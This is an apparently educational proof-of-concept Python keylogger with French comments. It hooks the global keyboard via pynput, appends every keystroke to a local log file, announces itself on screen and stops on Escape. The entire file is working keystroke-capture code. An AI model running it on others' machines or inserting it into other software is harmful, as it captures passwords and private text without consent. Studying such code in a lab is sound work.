#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Dossier: Ware - Étape 01: Keylogger (PoC Éducatif)
Intention: Al-Hafiz (Comprendre pour préserver et protéger)
Description: Ce script intercepte les touches du clavier en arrière-plan
             et les consigne dans un fichier local à des fins d'analyse.
"""

from pynput import keyboard

# Chemin du fichier où seront stockées les frappes
LOG_FILE = "key_log.txt"


def on_press(key):
    """Fonction déclenchée à chaque fois qu'une touche est enfoncée."""
    try:
        # Tente de récupérer le caractère de la touche (lettres, chiffres)
        key_data = key.char
    except AttributeError:
        # Gère les touches spéciales (Espace, Entrée, Maj, etc.)
        if key == keyboard.Key.space:
            key_data = " [ESPACE] "
        elif key == keyboard.Key.enter:
            key_data = " [ENTRÉE]\n"
        elif key == keyboard.Key.backspace:
            key_data = " [RETOUR] "
        else:
            key_data = f" [{key.name.upper()}] "

    # Écriture immédiate dans le fichier de log (simule la persistance)
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(key_data)


def on_release(key):
    """Fonction déclenchée lorsqu'une touche est relâchée."""
    # Condition d'arrêt du script pour notre laboratoire : presser la touche Échap (Esc)
    if key == keyboard.Key.esc:
        print("\n[!] Arrêt du Keylogger et fermeture du flux sécurisée.")
        return False


if __name__ == "__main__":
    print("=" * 50)
    print(" Lancement du PoC Keylogger (Environnement Virtuel) ")
    print(f" Les frappes sont enregistrées dans : {LOG_FILE}")
    print(" Appuie sur 'Échap' (ESC) à tout moment pour quitter.")
    print("=" * 50)

    # Initialisation de l'écouteur global du clavier (Hook)
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
